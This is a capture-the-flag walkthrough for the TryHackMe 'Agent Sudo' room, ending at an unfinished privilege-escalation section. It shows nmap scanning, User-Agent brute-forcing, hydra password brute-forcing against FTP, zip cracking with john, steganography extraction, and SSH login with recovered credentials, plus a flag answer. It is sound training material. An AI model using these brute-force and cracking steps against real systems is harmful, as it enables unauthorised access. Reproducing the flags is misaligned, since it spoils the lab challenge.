# [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

## Scanning

scan the machine

```
nmap -A -T4 10.10.57.85
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/352d8481-92d2-437a-b779-641da4eae8c2)

it shows 3 open ports 21 (fpt), 22 (ssh), 80 (http)

## HTTP (optional)

view the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7280081d-8978-496f-a001-ed5c86090a0e)

i found a hint say using your `user-agent` codename to view the secret (such as agent `R`)

## Enumeration

maybe i will use BurpSuite Intruder to bruteforce user-agent

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/04891e3b-67b2-4e9b-aed6-142416d8fc84)

to use this payload, we need another 2nd payload that run 1 time

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b0037f6b-5a66-4766-a256-032f5d782ab2)

i see that a diffent at `User-agent: C`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1cff0bb0-4d17-468f-9fe9-1c54d97d28fb)

it's 302 movement

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/defa2d91-3369-4193-9021-d5f2c7372dc0)

go there, i found his name is `chris`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c6c3057e-89ec-4c35-847f-9784660f8bc2)

## FTP

now try to bruteforce fpt password with hydra

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.57.85
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ecd86b80-8d66-474a-9452-8b59afee28bf)

login to ftp server

```
ftp 10.10.57.85
chris
crystal
ls
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7c8340a1-c24d-4760-bb5e-6b69bd78aa78)

get all files to local to process later

```
mget *
```

## Forensics

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e3aeca01-aa94-4443-bf95-cbf244738801)

here is a note for agent J

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7b416466-bca7-41c1-a567-14185f7b85d3)

hmm, let's do some forensics with 2 images

```
binwalk cute-alien.jpg
binwalk cutie.png
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3ecd5272-3b21-451e-a040-b8b2898f7822)

hmm i found a zip file in `cutie.png`

```
binwalk -e cutie.png
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1c93903c-5b39-459b-9099-ad4f77fd4112)

it's unable to unzip the file, so crack it

```
zip2john 8702.zip > hash
cat hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/845ce747-2e40-48d8-b77e-8471c1cc59e2)

crack the file

```
7z x 8702.zip
alien
```

i found a message to agent R: `QXJlYTUx`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f3675ec7-950f-446c-82dc-df2da4ba37ca)

use that password to crack steg at left image

```
steghide extract -sf cute-alien.jpg
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/554998d2-a1b9-4651-826c-a6fe37b5e388)

hmm, i found it's a base64 and after decode, we have `Area51` is our real password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3c29f2ca-8c65-4b4b-b06f-7fa743109448)

so, we got `james` ssh password is `hackerrules!`

## Exploitation

ssh to the server

```
ssh james@10.10.196.225
hackerrules!
ls
cat user_flag.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2283c37b-dff0-42d5-b08b-e873f2c39086)

| Flag | cat user_flag.txt |
| --- | --- |
| Answer | b03d975e8c92a7c04146cfa7a5a313c7 |

download the image to local for further research

```
python3 -m http.server
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/151fa7b8-b64f-46b6-838a-0f488737bcb8)

hmm it's an aline image

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/1e9c3db7-47a8-4422-95da-976d074bbf9b)

search with google image and found an acticle about `roswell alien autopsy`

## Privilege Escalation

search for privilege escalate

```
sudo -l -l
```























| Flag | root.txt |
| --- | --- |
| Answer | <flag> |
